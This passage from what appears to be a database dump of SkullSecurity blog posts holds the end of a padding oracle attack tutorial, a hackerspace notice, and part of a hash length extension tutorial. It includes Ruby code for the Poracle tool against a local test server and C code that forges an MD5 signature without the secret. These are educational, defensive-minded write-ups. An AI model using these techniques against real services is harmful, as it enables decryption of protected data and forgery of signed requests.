similar — and a protocol that allows unlimited retries to actually be interesting. For the purposes of simplicity, let\'s look at something easier.\nFrequently — in a practice that I don\'t think is a great idea — a Web server will entrust a client with encrypted data in either a cookie or a hidden field. The advantage to doing this is that the server doesn\'t need to maintain state — the client holds the state. The disadvantage is that, if the client can find a way to modify the encrypted data, they can play with private state information. Not good. In the case of ASP.net, this was enough to read/write to the filesystem.\nSo, for the purpose of this discussion, let\'s imagine a Web server that puts data in a hidden field/cookie and attempts to decrypt the data when the client returns it, then reveals to the client whether or not the padding was correct, for example by returning a Web page with the user logged-in.\nBlock ciphers\nAll right, now that we have the situation in mind, let\'s take a step back and look at block ciphers.\nA block cipher operates on data in fixed-size blocks — 64-bit for DES, 128-bit for AES, etc. It encrypts each block then moves onto the next one, and the next one, and so on. When the data is decrypted, it also starts with the first block, then the next, and so on.\nThis leads to two questions:\n\nWhat happens if the length of the data isn\'t a multiple of the block size?\nWhat happens if more than one block is identical, and therefore encrypts identically?\n\nLet\'s look at each of those situations...\nPadding\nPadding, padding, padding. Always with the padding. So, every group of cryptographic standards uses different padding schemes. I don\'t know why. There may be a great reason, but I\'m not a mathematician or a cryptographer, and I don\'t understand it. In the hash extension blog I wrote awhile back, I talked about how hashing algorithms pad — by adding a 1 bit, followed by a bunch of 0 bits, then the length (so, in terms of bytes, \"\\x80\\x00\\x00\\x00 ... <length>\"). That\'s not how block ciphers pad.\nEvery block cipher I\'ve seen uses PKCS7 for padding. PKCS7 says that the value to pad with is the number of bytes of padding that are required. So, if the blocksize is 8 bytes and we have the string \"ABC\", it would be padded \"ABC\\x05\\x05\\x05\\x05\\x05\". If we had \"ABCDEFG\", with padding it would become \"ABCDEFG\\x01\".\nAdditionally, if the string is a multiple of the blocksize, an empty block of only padding is appended. This may sound weird — why use padding when you don\'t need it? — but it turns out that you couldn\'t otherwise distinguish, for example, the string \"ABCDEFG\\x01\" from \"ABCDEFG\" (the \"\\x01\" at the end looks like padding, but in reality it\'s part of the string). Therefore, \"ABCDEFGH\", with padding, would become \"ABCDEFGH\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\".\nExclusive or (XOR)\nThis is just a very quick note on the exclusive or — XOR — operator, for those of you who may not be familiar with its crypto usage. XOR — denoted as \'⊕\' throughout this document and usually denoted as \'^\' in programming languages — is a bitwise operator that is used, in crypto, to mix two values together in a reversible way. A plaintext XORed with a key creates ciphertext, and XORing it with that the key again restores the plaintext. It is used for basically every type of encryption in some form, due to this reversible properly, and the fact that once it\'s been XORed, it doesn\'t reveal any information about either value.\nXOR is also commutative and a bunch of other mathy stuff. To put it into writing:\n\r\n  A ⊕ A = 0\r\n  A ⊕ 0 = A\r\n  A ⊕ B = B ⊕ A\r\n  (A ⊕ B) ⊕ C = A ⊕ (B ⊕ C)\r\n  ∴ A ⊕ B ⊕ B = A ⊕ (B ⊕ B) = A ⊕ 0 = A\r\n\nIf you don\'t fully understand every line, please read up on the bitwise XOR operator before you continue! You won\'t understand any of this otherwise. You need to be very comfortable with how XOR works.\nWhen we talk about XORing, it could mean a few things:\n\nWhen we talk about XORing bits, we simply XOR together the two arguments (0⊕0=0, 0⊕1=1, 1⊕0=1, 1⊕1=0)\nWhen we talk about XORing bytes, we XOR each bit in the first argument with the corresponding bit in the second\nWhen we talk about XORing strings, we XOR each byte in the first string with the corresponding byte in the second. If they have different lengths there\'s a problem in the algorithm and any result is invalid\n\nCipher-block chaining (CBC)\nNow, this is where things get interesting. CBC. And not the Canadian television station, either — the cryptographic construct. This is what ensures that no two blocks — even if they contain identical plaintext — will encrypt to the same ciphertext. It does this by mixing the ciphertext from the previous round into the plaintext of the next round using the XOR operator. In mathematical notation:\n\r\n  Let P   = the plaintext, and Pn = the plaintext of block n.\r\n  Let C   = the corresponding ciphertext, and Cn = the ciphertext of block n.\r\n  Let N   = the number of blocks (P and C have the same number of blocks by\r\n            definition).\r\n  Let IV  = the initialization vector — a random string — frequently\r\n            (incorrectly) set to all zeroes.\r\n  Let E() = a single-block encryption operation (any block encryption algorithm, such\r\n            as AES or DES, it doesn\'t matter which), with some unique and unknown (to\r\n            the attacker) secret key (that we don\'t notate here).\r\n  Let D() = the corresponding decryption operation.\r\n\nWe can then define the encrypted ciphertext — C — in terms of the encryption algorithm, the plaintext, and the initialization vector:\n\r\n  C1 = E(P1 ⊕ IV)\r\n  Cn = E(Pn ⊕ Cn-1) — for all n > 1\r\n\nYou can use this Wikipedia diagram to help understand.\nIn English, the first block of plaintext is XORed with an initialization vector. The rest of the blocks of plaintext are XORed with the previous block of ciphertext. Thinking of the IV as C0 can be helpful.\nDecryption is the opposite:\n\r\n  P1 = D(C1) ⊕ IV\r\n  Pn = D(Cn) ⊕ Cn-1 - for all n > 1\r\n\nYou can use this Wikipedia diagram to help understand.\nIn English, this means that the first block of ciphertext is decrypted, then XORed with the IV. Remaining blocks are decrypted then XORed with the previous block of ciphertext. Note that this operation is between a ciphertext block — that we control — and a plaintext block — that we\'re interested in. This is important.\nOnce all blocks are decrypted, the padding on the last block is validated. This is also important.\nThe attack\nGuess what? We now know enough to pull of this attack. But it\'s complicated and requires math, so let\'s be slow and gentle. [Editor\'s note: TWSS]\nFirst, the attacker breaks the ciphertext into the individual blocks, based on the blocksize of the algorithm. We\'re going to decrypt each of these blocks separately. This can be done in any order, but going from the last to the first makes the most sense. CN — remembering that C is the ciphertext and N is the number of blocks — is the value we\'re going to attack first.\nNext, the attacker generates his own block of ciphertext. It doesn\'t matter what it decrypts to or what the value is. Typically we start with all zeroes, but any random text will work fine. In the tool I\'m releasing, this is optimized for ASCII text, but that\'s beyond the scope of this discussion. We\'re going to denote this block as C′.\nThe attacker creates the string (C′ || Cn) — \"||\" is the concatenation operator in crypto notation — and sends it to the oracle for decryption. The oracle attempts to decrypt the string as follows:\n\r\n  Let C′     = our custom-generated ciphertext block\r\n  Let C′[k]  = the kth byte of our custom-generated ciphertext block\r\n  Let P′     = the plaintext generated by decrypting our string, (C′ || Cn)\r\n  Let P′n    = the nth block of P′\r\n  Let P′n[k] = kth byte of the nth plaintext block\r\n  Let K      = the number of bytes in each block\r\n\nNow, we can define P′ in terms of our custom ciphertext, the IV, and the decryption function:\n\r\n  P′1 = D(C′) ⊕ IV\r\n  P′2 = D(CN) ⊕ C′\r\n\nThis shows the two blocks we created being decrypted in the usual way — Pn = D(Cn) ⊕ Cn-1.\nP′1 is going to be meaningless garbage — we don\'t care what it decrypts to — but P′2 is where it gets interesting! Let\'s look more closely at P′2:\n\r\n  Given:       P′2 = D(Cn) ⊕ C′\r\n  And knowing: Cn  = E(Pn ⊕ Cn-1)\r\n  Implies:     P′2 = D(E(Pn ⊕ Cn-1)) ⊕ C′\r\n\nRemember, the variables marked with prime — ′ — are ones that result from our custom equation, and variables without a prime are ones from the original equation.\nWe know that D(E(x)) = x, by the definition of encryption, so we can reduce the most recent formula to:\n\r\n  P′2 = Pn ⊕ Cn-1 ⊕ C′\r\n\nNow we have four values in our equation:\n\nP′2: An unknown value that the server calculates during our \"attack\" (more on this later).\nPn: An unknown value that we want to determine, from the original plaintext.\nCn-1: A known value from the original ciphertext.\nC′: A value that we control, and can change at will.\n\nYou might see where we\'re going with this! Notice that we have a formula for Pn that doesn\'t contain any encryption operations, just XOR!\nThe problem is, we have two unknown values: we don\'t know P′2 or Pn. A formula with two unknowns can\'t be solved, so we\'re outta luck, right?\nOr are we?\nHere comes the oracle!\nRemember, we have one more piece of information — the padding oracle! That means that we can actually determine when P′2[K] — the last byte of P′2 — is equal to \"\\x01\" (in other words, we can determine when P′2 has valid padding)!\nSo now, let\'s take the formula we were using earlier, but instead of looking at the full strings, we\'ll look specifically at the last character of the encrypted strings:\n\r\n  P′2[K] = Pn[K] ⊕ Cn-1[K] ⊕ C′[K]\r\n\nWe send (C′ || Cn) to the oracle with every possible value of C′[K], until we find a value that doesn\'t generate a padding error. When we find that value, we know beyond any doubt that the value at P′2[K] is \"\\x01\". Otherwise, the padding would be wrong. It HAS to be that way (actually, that\'s not entirely true, it can be \"\\x02\" if P′2[K-1] is \"\\x02\" as well — we\'ll deal with that later).\nAt that point, we have the following variables:\n\nP′2[K]: The valid padding value (\"\\x01\").\nPn[K]: The last byte of plaintext — our unknown value.\nCn-1[K]: The last byte of the previous block of ciphertext — a known value.\nC′[K]: The byte we control — and previously modified — to create the valid padding.\n\nAll right, we have three known variables! Let\'s re-write the equation a little — XOR being commutative, we\'re allowed to move variables around at will:\n\r\n  Original:       P′2[K] = Pn[K] ⊕ Cn-1[K] ⊕ C′[K]\r\n  Re-arranged:    Pn[K] = P′2[K] ⊕ Cn-1[K] ⊕ C′[K]\r\n  Substitute \"1\": Pn[K] = 1 ⊕ Cn-1[K] ⊕ C′[K]\r\n\nWe just defined Pn[K] using three known variables! That means that we plug in the values, and \"turn the crank\" as my former physics prof used to say, and we get the last byte of plaintext. Why? Because MATH!\nStepping back a bit\nSo, the math checks out, but what\'s going on conceptually?\nHave another look at the Wikipedia diagram of cipher-block chaining. We\'re interested in the box in the very bottom-right corner — the padding. That value, as you can see on the diagram, is equal to the ciphertext left of it, XORed with the decrypted text above it.\nNotice that there\'s no actual crypto that we have to defeat — just the XOR operation between a known value and the unknown value to produce a known value. Pretty slick, eh? Fuck your keys and transposition and s-boxes — I just broke your encryption after you did all that for me! :)\nIterating\nSo, we now know the value of the last character of PN. That\'s pretty awesome, but it\'s also pretty boring, because the last byte is guaranteed to be padding (well, only if this is the last block). The question is, how do we get the second-, third-, and fourth-last bytes?\nHow do we calculate PN[K-1]? Well, it turns out that it\'s pretty simple. If you\'ve been following so far, you can probably already see it.\nFirst, we have to set C′[K] to an appropriate value such that P′[K] = 2. Why 2? Because we are now interested the second-last byte of P′N, and we can determine it by setting the last byte to 2, and trying every possible value of C′[K-1] until we stop getting padding errors, confirming that P′N ends with \"\\x02\\x02\".\nEnsuring that P′[K] = 2 easy (although you don\'t realize how easy until you realize how long it took me to work out and explain this formula for the blog); we just take this formula that we derived earlier, plug in \'2\' for P′[K], and solve for C′[K]:\n\r\n  We have:         C′[K] = P′2[K] ⊕ PN[K] ⊕ CN-1[K]\r\n  Plug in the \"2\": C′[K] = 2 ⊕ PN[K] ⊕ CN-1[K]\r\n\nWhere our variables are defined as:\n\nC′[K] — The last byte in the C′ block, which we\'re sending to the oracle and that we fully control.\nPN[K] — The last byte in this block\'s plaintext, which we\'ve solved for already.\nCN-1[K] — The last byte in the previous ciphertext block, which we know.\n\nI don\'t think I have to tell you how to calculate PN[K-2], PN[K-3], etc. It\'s the same principle, applied over and over from the end to the beginning.\nA tricky little thing called the IV\nIn the same way that we can solve the last block of plaintext — PN — we can also solve other blocks PN-1, PN-2, etc. In fact, you don\'t even have to solve from right to left — each block can be solved in a vacuum, as long as you know the ciphertext value of the previous block.\n...which brings us to the first block, P1. Earlier, we stated that P1 is defined as:\n\r\n  P1 = D(C1) ⊕ IV\r\n\nThe \"last block\" value for P1 — the block we\'ve been calling Cn-1 — is the IV. So what do you do?\nWell, as far as I can tell, there\'s no easy answer. Some of the less easy answers are:\n\nTry a null IV — many implementations won\'t set an IV — which, of course, has its own set of problems. But it\'s common, so it\'s worth trying.\nIf you can influence text near the beginning of the encrypted string — say, a username — use as much data as possible to force the first block to be filled with stuff we don\'t want anyway.\nFind a way to reveal the IV, which is fairly unlikely to happen.\nIf you can influence the hashing algorithm, try using an algorithm with a shorter blocksize (like DES, which has a blocksize of 64 bits — only 8 bytes).\nIf all else fails, you\'re outta luck, and you\'re only getting the second block and onwards. Sorry!\n\nPoracle\nIf you follow my blog, you know that I rarely talk about an interesting concept without releasing a tool. That ain\'t how I roll. So, I present to you: Poracle (short for \'padding oracle\', get it?)\nPoracle is a library that I put together in Ruby. It\'s actually really, really simple. You have to code a module for the particular attack — unfortunately, because every attack is different, I can\'t make it any simpler than that. The module needs to implement a couple simple methods for getting values — like the blocksize and, if possible, the IV. The most important method, however, is attempt_decrypt(). It must attempt to decrypt the given block and return a boolean value based on its success — true if the padding was good, and false if it was not. Here\'s an example of a module I wrote for a HTTP service:\n\r\n##\r\n# RemoteTestModule.rb\r\n# Created: December 10, 2012\r\n# By: Ron Bowes\r\n#\r\n# A very simple implementation of a Padding Oracle module. Basically, it\r\n# performs the attack against an instance of RemoteTestServer, which is an\r\n# ideal padding oracle target.\r\n##\r\n#\r\nrequire \'httparty\'\r\n\r\nclass RemoteTestModule\r\n  attr_reader :iv, :data, :blocksize\r\n\r\n  NAME = \"RemoteTestModule(tm)\"\r\n\r\n  def initialize()\r\n    @data = HTTParty.get(\"http://localhost:20222/encrypt\").parsed_response\r\n    @data = [@data].pack(\"H*\")\r\n    @iv = nil\r\n    @blocksize = 16\r\n  end\r\n\r\n  def attempt_decrypt(data)\r\n    result = HTTParty.get(\"http://localhost:20222/decrypt/#{data.unpack(\"H*\").pop}\")\r\n\r\n    return result.parsed_response !~ /Fail/\r\n  end\r\n\r\n  def character_set()\r\n    # Return the perfectly optimal string, as a demonstration\r\n    return \' earnisoctldpukhmf,gSywb0.vWD21\'.chars.to_a\r\n  end\r\nend\r\n\nThen, you create a new instance of the Poracle class, pass in your module, and call the decrypt() method. Poracle will do the rest! It looks something like this:\n\r\n1 begin\r\n2   mod = RemoteTestModule.new\r\n3   puts Poracle.decrypt(mod, mod.data, mod.iv, true, true)\r\n4 rescue Errno::ECONNREFUSED => e\r\n5   puts(e.class)\r\n6   puts(\"Couldn\'t connect to remote server: #{e}\")\r\n7 end\r\n\nFor more information, grab Poracle.rb and read the header comments. It\'ll be more complete and up-to-date than this blog post can ever be.\nI implemented a couple test modules — a local and a remote. LocalTestModule.rb will generate its own ciphertext with any algorithm you want, then attempt_decrypt() simply tries to decrypt it in-line. Not very interesting, but good to make sure I didn\'t break anything.\nRemoteTestModule.rb is more interesting. It comes with a server — RemoteTestServer.rb — which runs on Sinatra. The service is the simplest padding oracle vulnerability you can imagine — it has a path — \"/encrypt\" — that retrieves an encrypted string, and another path — \"/decrypt\" — that tries to decrypt it and reports \"success\" or \"fail\". That\'s it.\nTo try these, either just run \"ruby DoTests.rb\" or start the server with \"ruby RemoteTestServer.rb\" and then, in another window (or whatever), run \"ruby DoTests.rb remote\".\nOne interesting tidbit — Poracle doesn\'t actually require OpenSSL to function, or even an encryption library. All encryption and decryption are done by the service, not by Poracle. In fact, Poracle itself has not a single dependency (although the test modules do require OpenSSL, obviously, as well as Sinatra and httparty for the remote test module.\nBacktracking\nDo you ever have that feeling that you\'re an idiot? I do, on a regular basis, and I\'m not really sure why... but I\'m gonna tell you a story about the development of Poracle that helps explain why I never want to be a real programmer.\nSo, while developing Poracle, I was worried about false positives and backtracking. What happens if I was trying to guess the last byte and instead of \"xx yy zz 01\", we wound up with \"xx yy zz 02\", where zz = \"02\"? \"02 02\", or two twos, is valid padding. That means we thought we\'d guessed a \"01\", but it\'s actually \"02\"! False positive!\nThat\'s obviously a problem, but I went further, well into the regions of insanity. What if we\'re cracking the second-last digit and it was a \"03\"? What if we\'re on the 13th digit and it\'s a \"0d\"? So, I decided I\'d do backtracking. After finding each digit, I\'d recurse, and find the next. If none of the 256 possible characters works for the next byte, I\'d return and the caller would continue guessing bytes. That made things complicated. It\'s recursion, that\'s what it\'s for!\nThen, to speed things up and clean up some of the code, I tried to convert it to iteration. Haha. Trying to go back and forth in an array to track where we were left off when we hit the bad padding was painful. I will spare you the madness of explaining where I went with that. It wasn\'t pretty.\nThat\'s when I started talking to Mak, who, contrary to popular belief, can actually save your sanity and not just drain it! He also makes a perfect rubber duck. Although he wasn\'t answering on IRC, I realized something just by explaining the problem to him — I can only ever get a padding error on the last digit of each block, because once I\'ve sure — positive — that the last digit is \"\\x01\", we can reliably set it to \"\\x02\", \"\\x03\", etc. Because math! That means that we only have to worry about accidentally getting \"\\x02\\x02\", \"\\x03\\x03\\x03\", \"\\x04\\x04\\x04\\x04\", etc, on the last digit of the block, nowhere else.\nOnce I realized that, it was easy! After we successfully determine the last digit, we make one more request, where we XOR the second-last byte with \"\\x01\". That means if that the string was originally ending with \"\\x02\\x02\", it would end with \"\\x03\\x02\" and the padding would fail.\nSo, with one extra request, I can do a nice, simple, clean, iterative algorithm, instead of a crazy complex recursive one. And that opened the door to... optimization!\nOptimization\nSo, now we have clean, working code. However, this effectively guesses characters randomly. We try \"\\x00\" to \"\\xFF\" for the last byte of C′, but after all the XOR operations, the order that values are guessed for Pn is effectively random. But, what if instead of guessing values for C′, you guessed values for Pn? The math is actually quite simple and is based on this formula:\n\r\n  Pn[k] = 1 ⊕ Cn-1[k] ⊕ C′[k]\r\n\nInstead of choosing values for C′[k], you can choose the value for Pn[k] that you want to guess, then solve for C′[k]\nSince most strings are ASCII or, at least, in some way predictable, I started guessing each character in order, from 0 to 255. Since ASCII tends to be lower, it sped things up by a significant amount. After some further tweaking, I came up with the following algorithm:\n\nIf we\'re at the end of the last block, we start with guessing at \"\\x01\", since that\'s the lowest possible byte that the (actual) padding can be.\nThe last byte of the block is padding, so for that many bytes from the end, we guess the same byte. For example, if the last byte is \"\\x07\", we guess \"\\x07\" for the last 7 bytes — this lets us determine the padding bytes on our first guess every time!\nFinally, we weight more heavily toward ASCII characters, in order of the frequency that they occur in the English language, based on text from the Battlestar Galactica Wiki because, why not Cylon?\n\nOn my test block of text, running against a Web server on localhost, I improved a pretty typical attack from 33,020 queries taking 63 seconds to 2,385 queries and 4.71 seconds.\nCiphers\nOne final word — and maybe this will help with Google results :) — I\'ve tested this successfully against the following ciphers:\n\nCAST-cbc\naes-128-cbc\naes-192-cbc\naes-256-cbc\nbf-cbc\ncamellia-128-cbc\ncamellia-192-cbc\ncamellia-256-cbc\ncast-cbc\ncast5-cbc\ndes-cbc\ndes-ede-cbc\ndes-ede3-cbc\ndesx-cbc\nrc2-40-cbc\nrc2-64-cbc\nrc2-cbc\nseed-cbc\n\nBut that\'s not interesting, because this isn\'t an attack against ciphers. It\'s an attack against cipher-block chaining — CBC — that can occur against any block cipher.\nConclusion\nSo, hopefully you understand a little bit about how padding oracles work. If you haven\'t read my blog about hash extension attacks, go do that. It\'s pretty cool. Otherwise, if you\'re going to be around for Shmoocon in DC this winter, come see my talk!', '\'Conferences\', \'Crypto\', \'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (38, 'What’s going on with SkullSpace (our hackerspace)?', 'Ron Bowes', '2012-11-5', 'Hey everybody,\nThis is just a super quick post today to direct you here - http://www.skullspace.ca/blog/2012/11/skullspace-2-0-the-new-frontier/.\nThat\'s a post I wrote about SkullSpace - the hackerspace that me and several others helped found a couple years ago. We went down a \"too good to be true\" road, where we had a ton of space and super cheap rent. And, eventually, got bitten by it. We\'re in the process of moving, and started a fundraiser to make it happen.\nAnyway, read the post! It\'s interesting. :)\nRon', '\'Default\'', 'https://blog.skullsecurity.org/2012/current-and-future-challenges-of-the-hackerspace-i-founded');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (39, 'Everything you need to know about hash length extension attacks', 'Ron Bowes', '2012-9-25', 'You can grab the hash_extender tool on Github!\n(Administrative note: I\'m no longer at Tenable! I left on good terms, and now I\'m a consultant at Leviathan Security Group. Feel free to contact me if you need more information!)\nAwhile back, my friend @mogigoma and I were doing a capture-the-flag contest at https://stripe-ctf.com. One of the levels of the contest required us to perform a hash length extension attack. I had never even heard of the attack at the time, and after some reading I realized that not only is it a super cool (and conceptually easy!) attack to perform, there is also a total lack of good tools for performing said attack!  After hours of adding the wrong number of null bytes or incorrectly adding length values, I vowed to write a tool to make this easy for myself and anybody else who\'s trying to do it. So, after a couple weeks of work, here it is!\n\nNow I\'m gonna release the tool, and hope I didn\'t totally miss a good tool that does the same thing! It\'s called hash_extender, and implements a length extension attack against every algorithm I could think of:\n\nMD4\nMD5\nRIPEMD-160\nSHA-0\nSHA-1\nSHA-256\nSHA-512\nWHIRLPOOL\n\nI\'m more than happy to extend this to cover other hashing algorithms as well, provided they are \"vulnerable\" to this attack — MD2, SHA-224, and SHA-384 are not. Please contact me if you have other candidates and I\'ll add them ASAP!\nThe attack\nAn application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm, and entrusts the attacker with both the string and the hash, but not the secret.  Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data.\nIt turns out, even though the attacker doesn\'t know the value of the prepended secret, he can still generate a valid hash for {secret || data || attacker_controlled_data}! This is done by simply picking up where the hashing algorithm left off; it turns out, 100% of the state needed to continue a hash is in the output of most hashing algorithms! We simply load that state into the appropriate hash structure and continue hashing.\nTL;DR: given a hash that is composed of a string with an unknown prefix, an attacker can append to the string and produce a new hash that still has the unknown prefix.\nExample\nLet\'s look at a step-by-step example. For this example:\n\nlet secret    = \"secret\"\nlet data      = \"data\"\nlet H         = md5()\nlet signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5b\nlet append    = \"append\"\n\nThe server sends data and signature to the attacker. The attacker guesses that H is MD5 simply by its length (it\'s the most common 128-bit hashing algorithm), based on the source, or the application\'s specs, or any way they are able to.\nKnowing only data, H, and signature, the attacker\'s goal is to append append to data and generate a valid signature for the new data. And that\'s easy to do! Let\'s see how.\nPadding\nBefore we look at the actual attack, we have to talk a little about padding.\nWhen calculating H(secret + data), the string (secret + data) is padded with a \'1\' bit and some number of \'0\' bits, followed by the length of the string. That is, in hex, the padding is a 0x80 byte followed by some number of 0x00 bytes and then the length. The number of 0x00 bytes, the number of bytes reserved for the length, and the way the length is encoded, depends on the particular algorithm and blocksize.\nWith most algorithms (including MD4, MD5, RIPEMD-160, SHA-0, SHA-1, and SHA-256), the string is padded until its length is congruent to 56 bytes (mod 64). Or, to put it another way, it\'s padded until the length is 8 bytes less than a full (64-byte) block (the 8 bytes being size of the encoded length field). There are two hashes implemented in hash_extender that don\'t use these values: SHA-512 uses a 128-byte blocksize and reserves 16 bytes for the length field, and WHIRLPOOL uses a 64-byte blocksize and reserves 32 bytes for the length field.\nThe endianness of the length field is also important. MD4, MD5, and RIPEMD-160 are little-endian, whereas the SHA family and WHIRLPOOL are big-endian. Trust me, that distinction cost me days of work!\nIn our example, length(secret || data) = length(\"secretdata\") is 10 (0x0a) bytes, or 80 (0x50) bits. So, we have 10 bytes of data (\"secretdata\"), 46 bytes of padding (80 00 00 ...), and an 8-byte little-endian length field (50 00 00 00 00 00 00 00), for a total of 64 bytes (or one block). Put together, it looks like this:\n\r\n  0000  73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00  secretdata......\r\n  0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\r\n  0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\r\n  0030  00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00  ........P.......\r\n\nBreaking down the string, we have:\n\n\"secret\" = secret\n\"data\" = data\n80 00 00 ... — The 46 bytes of padding, starting with 0x80\n50 00 00 00 00 00 00 00 — The bit length in little endian\n\nThis is the exact data that H hashed in the original example.\nThe attack\nNow that we have the data that H hashes, let\'s look at how to perform the actual attack.\nFirst, let\'s just append append to the string. Easy enough!  Here\'s what it looks like:\n\r\n  0000  73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00  secretdata......\r\n  0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\r\n  0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\r\n  0030  00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00  ........P.......\r\n  0040  61 70 70 65 6e 64                                append\r\n\nThe hash of that block is what we ultimately want to a) calculate, and b) get the server to calculate. The value of that block of data can be calculated in two ways:\n\nBy sticking it in a buffer and performing H(buffer)\nBy starting at the end of the first block, using the state we already know from signature, and hashing append starting from that state\n\nThe first method is what the server will do, and the second is what the attacker will do. Let\'s look at the server, first, since it\'s the easier example.\nServer\'s calculation\nWe know the server will prepend secret to the string, so we send it the string minus the secret value:\n\r\n  0000  64 61 74 61 80 00 00 00 00 00 00 00 00 00 00 00  data............\r\n  0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\r\n  0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\r\n  0030  00 00 50 00 00 00 00 00 00 00 61 70 70 65 6e 64  ..P.......append\r\n\nDon\'t be fooled by this being exactly 64 bytes (the blocksize) — that\'s only happening because secret and append are the same length. Perhaps I shouldn\'t have chosen that as an example, but I\'m not gonna start over!\nThe server will prepend secret to that string, creating:\n\r\n  0000  73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00  secretdata......\r\n  0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\r\n  0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\r\n  0030  00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00  ........P.......\r\n  0040  61 70 70 65 6e 64                                append\r\n\nAnd hashes it to the following value:\n\r\n  6ee582a1669ce442f3719c47430dadee\r\n\nFor those of you playing along at home, you can prove this works by copying and pasting this into a terminal:\n\r\n  echo \'\r\n  #include <stdio.h>\r\n  #include <openssl/md5.h>\r\n\r\n  int main(int argc, const char *argv[])\r\n  {\r\n    MD5_CTX c;\r\n    unsigned char buffer[MD5_DIGEST_LENGTH];\r\n    int i;\r\n\r\n    MD5_Init(&c);\r\n    MD5_Update(&c, \"secret\", 6);\r\n    MD5_Update(&c, \"data\"\r\n                   \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\r\n                   \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\r\n                   \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\r\n                   \"\\x00\\x00\\x00\\x00\"\r\n                   \"\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\r\n                   \"append\", 64);\r\n    MD5_Final(buffer, &c);\r\n\r\n    for (i = 0; i < 16; i++) {\r\n      printf(\"%02x\", buffer[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n  }\' > hash_extension_1.c\r\n\r\n  gcc -o hash_extension_1 hash_extension_1.c -lssl -lcrypto\r\n\r\n  ./hash_extension_1\r\n\nAll right, so the server is going to be checking the data we send against the signature 6ee582a1669ce442f3719c47430dadee. Now, as the attacker, we need to figure out how to generate that signature!\nClient\'s calculation\nSo, how do we calculate the hash of the data shown above without actually having access to secret?\nWell, first, we need to look at what we have to work with: data, append, H, and H(secret || data).\nWe need to define a new function, H′, which uses the same hashing algorithm as H, but whose starting state is the final state of H(secret || data), i.e., signature. Once we have that, we simply calculate H′(append) and the output of that function is our hash. It sounds easy (and is!); have a look at this code:\n\r\n  echo \'\r\n  #include <stdio.h>\r\n  #include <openssl/md5.h>\r\n\r\n  int main(int argc, const char *argv[])\r\n  {\r\n    int i;\r\n    unsigned char buffer[MD5_DIGEST_LENGTH];\r\n    MD5_CTX c;\r\n\r\n    MD5_Init(&c);\r\n    MD5_Update(&c, \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\", 64);\r\n\r\n    c.A = htonl(0x6036708e); /* <-- This is the hash we already had */\r\n    c.B = htonl(0xba0d11f6);\r\n    c.C = htonl(0xef52ad44);\r\n    c.D = htonl(0xe8b74d5b);\r\n\r\n    MD5_Update(&c, \"append\", 6); /* This is the appended data. */\r\n    MD5_Final(buffer, &c);\r\n    for (i = 0; i < 16; i++) {\r\n      printf(\"%02x\", buffer[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n  }\' > hash_extension_2.c\r\n\r\n  gcc -o hash_extension_2 hash_extension_2.c -lssl -lcrypto\r\n\r\n  ./hash_extension_2\r\n\nThe the output is, just like before:\n\r\n  6ee582a1669ce442f3719c47430dadee\r\n\nSo we know the signature is right. The difference is, we didn\'t use secret at all! What\'s happening!?\nWell, we create a MD5_CTX structure from scratch, just like normal.  Then we take the MD5 of 64 \'A\'s. We take the MD5 of a full (64-byte) block of \'A\'s to ensure that any internal values — other than the state of the hash itself — are set to what we expect.\nThen, after that is done, we replace c.A, c.B, c.C, and c.D with the values that were found in signature: 6036708eba0d11f6ef52ad44e8b74d5b. This puts the MD5_CTX structure in the same state as it finished in originally, and means that anything else we hash — in this case append — will produce the same output as it would have had we hashed it the usual way.\nWe use htonl() on the values before setting the state variables because MD5 — being little-endian — outputs its values in little-endian as well.\nResult\nSo, now we have this string:\n\r\n  0000  64 61 74 61 80 00 00 00 00 00 00 00 00 00 00 00  data............\r\n  0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\r\n  0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\r\n  0030  00 00 50 00 00 00 00 00 00 00 61 70 70 65 6e 64  ..P.......append\r\n\nAnd this signature for H(secret || data || append):\n\r\n  6ee582a1669ce442f3719c47430dadee\r\n\nAnd we can generate the signature without ever knowing what the secret was!  So, we send the string to the server along with our new signature. The server will prepend the signature, hash it, and come up with the exact same hash we did (victory!).\nThe tool\nYou can grab the hash_extender tool on Github!\nThis example took me hours to write. Why? Because I made about a thousand mistakes writing the code. Too many NUL bytes, not enough NUL bytes, wrong endianness, wrong algorithm, used bytes instead of bits for the length, and all sorts of other stupid problems. The first time I worked on this type of attack, I spent from 2300h till 0700h trying to get it working, and didn\'t figure it out till after sleeping (and with Mak\'s help). And don\'t even get me started on how long it took to port this attack to MD5. Endianness can die in a 